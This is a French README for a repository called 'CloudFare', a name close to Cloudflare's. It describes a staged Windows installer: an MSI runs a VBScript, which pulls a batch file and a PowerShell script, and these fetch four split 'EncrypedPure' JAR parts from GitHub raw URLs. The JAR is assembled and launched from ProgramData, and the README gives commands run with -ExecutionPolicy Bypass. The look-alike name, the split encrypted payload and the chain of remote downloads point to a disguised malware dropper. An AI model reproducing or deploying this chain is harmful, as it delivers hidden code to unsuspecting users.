# CloudFare Deployment Repository

**Structure centralisée pour installation et déploiement CloudFare v2.0**

## 📁 Structure du Repo

```
repos/
├── scripts/          # Scripts d'installation et lancement
│   ├── Install.ps1              # Script principal d'installation
│   ├── Launch.ps1               # Script de lancement
│   ├── Install.bat              # Orchestrateur batch (via MSI)
│   ├── Setup.vbs                # Script VBScript (via MSI)
│   ├── Install_v2_Robust.ps1   # Version robuste d'installation
│   ├── Pre_Deployment_Check.ps1 # Vérification pré-déploiement
│   ├── Verify_URLs.ps1          # Vérification des URLs GitHub
│   └── ErrorHandler.ps1         # Gestion des erreurs
│
├── jar/              # Composants d'application
│   ├── EncrypedPure.part1.jar   # Partie 1 du JAR (10 MB)
│   ├── EncrypedPure.part2.jar   # Partie 2 du JAR (10 MB)
│   ├── EncrypedPure.part3.jar   # Partie 3 du JAR (10 MB)
│   └── EncrypedPure.part4.jar   # Partie 4 du JAR (10 MB)
│
├── msi/              # Fichiers de compilation MSI
│   ├── Setup.wxs              # Configuration WiX
│   └── Build-MSI.ps1          # Script de compilation MSI
│
├── docs/             # Documentation
│   ├── DEPLOYMENT_PLAN.md     # Plan de déploiement complet
│   ├── ARCHITECTURE.md        # Schéma d'architecture
│   └── README.md              # Guide utilisateur
│
└── tools/            # Utilitaires
    └── (Réservé pour futurs outils)
```

## 🚀 Installation Rapide

### Pour les utilisateurs:
```powershell
# Télécharger Setup.msi depuis GitHub Releases
# Double-cliquer pour installer automatiquement
```

### Pour les développeurs:
```bash
# Cloner le repo
git clone https://github.com/davidrenand/repos.git

# Naviguer dans le dossier scripts
cd repos/scripts

# Exécuter l'installation
powershell -ExecutionPolicy Bypass -File Install.ps1
```

## 📋 Flux d'Installation

```
1. Utilisateur télécharge Setup.msi
           ↓
2. MSI exécute Setup.vbs
           ↓
3. Setup.vbs télécharge Install.bat
           ↓
4. Install.bat exécute Install.ps1
           ↓
5. Install.ps1 télécharge 4 JAR parts depuis GitHub
           ↓
6. Assemble les 4 parts en App.jar (40 MB)
           ↓
7. Exécute Launch.ps1
           ↓
8. Application démarre
```

## 🔗 URLs de Base

- **Repository**: `https://github.com/davidrenand/repos`
- **Raw Content**: `https://raw.githubusercontent.com/davidrenand/repos/main/`
- **Releases**: `https://github.com/davidrenand/repos/releases`

### URLs des Scripts:
- Install.ps1: `https://raw.githubusercontent.com/davidrenand/repos/main/scripts/Install.ps1`
- Launch.ps1: `https://raw.githubusercontent.com/davidrenand/repos/main/scripts/Launch.ps1`
- Install.bat: `https://raw.githubusercontent.com/davidrenand/repos/main/scripts/Install.bat`

### URLs des JAR Parts:
- Part 1: `https://raw.githubusercontent.com/davidrenand/repos/main/jar/EncrypedPure.part1.jar`
- Part 2: `https://raw.githubusercontent.com/davidrenand/repos/main/jar/EncrypedPure.part2.jar`
- Part 3: `https://raw.githubusercontent.com/davidrenand/repos/main/jar/EncrypedPure.part3.jar`
- Part 4: `https://raw.githubusercontent.com/davidrenand/repos/main/jar/EncrypedPure.part4.jar`

## ✅ Vérification des URLs

Pour tester si tous les fichiers sont accessibles:
```powershell
powershell -ExecutionPolicy Bypass -File scripts/Verify_URLs.ps1
```

## 📝 Configuration Installation

Variables d'environnement:
- `INSTALL_DIR`: `C:\ProgramData\CloudFare`
- `JAVA_HOME`: `C:\ProgramData\CloudFare\Java`
- `APP_JAR`: `C:\ProgramData\CloudFare\App.jar`

## 🔐 Authentification GitHub

Token utilisé: `davidrenand` (personnel)

## 📦 Compilation MSI

Pour compiler un nouveau Setup.msi:
```powershell
cd msi
powershell -ExecutionPolicy Bypass -File Build-MSI.ps1
```

Prérequis: **WiX Toolset v3.11** (installé automatiquement si absent)

## 📚 Documentation Complète

- **Installation avancée**: Voir `docs/DEPLOYMENT_PLAN.md`
- **Architecture détaillée**: Voir `docs/ARCHITECTURE.md`
- **Guide utilisateur**: Voir `docs/README.md`

## 🆘 Support

En cas de problème:
1. Vérifier les URLs: `powershell -ExecutionPolicy Bypass -File scripts/Verify_URLs.ps1`
2. Vérifier pré-déploiement: `powershell -ExecutionPolicy Bypass -File scripts/Pre_Deployment_Check.ps1`
3. Consulter les logs: `C:\ProgramData\CloudFare\Logs\`

## 📄 License

Propriétaire - CloudFare Project

---

**Dernière mise à jour**: 27 novembre 2025
**Version**: 2.0 Deployment
**Auteur**: davidrenand
